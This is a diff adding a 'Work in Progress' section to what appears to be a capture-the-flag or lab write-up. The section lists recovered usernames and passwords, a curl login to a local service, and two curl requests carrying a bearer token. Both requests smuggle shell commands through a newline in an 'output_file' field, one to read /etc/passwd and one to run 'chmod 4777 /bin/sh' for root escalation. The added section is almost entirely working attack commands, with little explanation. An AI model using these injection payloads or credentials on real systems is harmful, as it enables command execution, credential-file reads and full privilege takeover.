@@ -169,3 +169,23 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:04
 ```
 
+## X. Work in Progress
+
+`shawking`: `quantumphysics`
+
+`developer`: `bigbang`
+
+
+```
+curl http://localhost:9090/login -H 'Content-Type: application/json' -d '{"username": "developer", "password": "bigbang"}'
+```
+
+```
+curl http://localhost:9090/command -d '{"command":"send_image","output_file":"\n /etc/passwd"}' -H 'Content-Type: application/json' \
+-H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTYzMDM3MCwianRpIjoiZmI1ZDkzYjItMWRmNS00NDgyLWI4MWUtYjAzNGVmZTdkZjUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NTYzMDM3MCwiY3NyZiI6Ijg4NWM5NGE3LTRkYjQtNGFjYS1iZjIzLTFjMWRkOTcwMWJiYiIsImV4cCI6MTc0NTYzMzk3MH0.FvDIB3zps3OMOONPdlCrjTCSc5qdV7F8J_MUrCFK-Pg'
+```
+
+```
+curl http://localhost:9090/command -d '{"command":"send_image","output_file":"\nchmod 4777 /bin/sh"}' -H 'Content-Type: application/json' \
+-H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTYzMDM3MCwianRpIjoiZmI1ZDkzYjItMWRmNS00NDgyLWI4MWUtYjAzNGVmZTdkZjUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NTYzMDM3MCwiY3NyZiI6Ijg4NWM5NGE3LTRkYjQtNGFjYS1iZjIzLTFjMWRkOTcwMWJiYiIsImV4cCI6MTc0NTYzMzk3MH0.FvDIB3zps3OMOONPdlCrjTCSc5qdV7F8J_MUrCFK-Pg'
+```
